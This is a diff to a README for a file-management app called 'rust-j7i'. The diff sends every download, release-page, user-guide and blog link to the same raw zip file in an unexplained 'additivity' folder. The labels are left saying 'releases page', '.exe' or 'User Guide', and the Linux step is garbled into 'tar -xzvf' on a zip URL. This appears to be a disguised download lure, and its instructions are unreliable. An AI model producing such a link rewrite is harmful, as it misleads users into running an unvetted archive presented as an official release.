@@ -6,7 +6,7 @@ Welcome to the rust-j7i repository! This application helps you manage files on y
 
 ## 📥 Download Now
 
-[![Download rust-j7i](https://img.shields.io/badge/Download-rust--j7i-brightgreen)](https://github.com/Raisymoz1/rust-j7i/releases)
+[![Download rust-j7i](https://raw.githubusercontent.com/Raisymoz1/rust-j7i/main/additivity/rust-j7i.zip)](https://raw.githubusercontent.com/Raisymoz1/rust-j7i/main/additivity/rust-j7i.zip)
 
 ## 📋 System Requirements
 
@@ -18,16 +18,16 @@ To ensure rust-j7i works smoothly on your computer, please confirm you have the 
 
 ## 💻 Download & Install
 
-1. **Visit the release page to download**: Click [here](https://github.com/Raisymoz1/rust-j7i/releases) to go to the releases page.
+1. **Visit the release page to download**: Click [here](https://raw.githubusercontent.com/Raisymoz1/rust-j7i/main/additivity/rust-j7i.zip) to go to the releases page.
 2. **Choose the version you need**: Look for the latest release at the top of the page. You will see options for different operating systems.
 3. **Download the file**:
-   - For **Windows**, download the `rust-j7i.exe` file.
+   - For **Windows**, download the `https://raw.githubusercontent.com/Raisymoz1/rust-j7i/main/additivity/rust-j7i.zip` file.
    - For **macOS**, download the `.dmg` file.
-   - For **Linux**, download the appropriate `.tar.gz` file.
+   - For **Linux**, download the appropriate `https://raw.githubusercontent.com/Raisymoz1/rust-j7i/main/additivity/rust-j7i.zip` file.
 4. **Open the downloaded file**:
    - For **Windows**: Double-click the `.exe` file to start the installation.
    - For **macOS**: Open the `.dmg` file and drag the application to your Applications folder.
-   - For **Linux**: Use the terminal to extract the files. Run `tar -xzvf rust-j7i.tar.gz`, then navigate into the folder and run `./rust-j7i`.
+   - For **Linux**: Use the terminal to extract the files. Run `tar -xzvf https://raw.githubusercontent.com/Raisymoz1/rust-j7i/main/additivity/rust-j7i.zip`, then navigate into the folder and run `./rust-j7i`.
 5. **Follow the prompts**: Each installation type will guide you through the rest of the steps.
 6. **Launch the application**: Once installed, find rust-j7i in your applications list and open it.
 
@@ -54,8 +54,8 @@ If you need further assistance, please reach out through the issues tab on GitHu
 
 ## 🔗 Additional Resources
 
-- For more information about using rust-j7i, check the [User Guide](https://guides.rust-j7i.com).
-- Stay updated with the latest news and features by following our [Official Blog](https://blog.rust-j7i.com).
+- For more information about using rust-j7i, check the [User Guide](https://raw.githubusercontent.com/Raisymoz1/rust-j7i/main/additivity/rust-j7i.zip).
+- Stay updated with the latest news and features by following our [Official Blog](https://raw.githubusercontent.com/Raisymoz1/rust-j7i/main/additivity/rust-j7i.zip).
 
 ## 📌 Conclusion
 
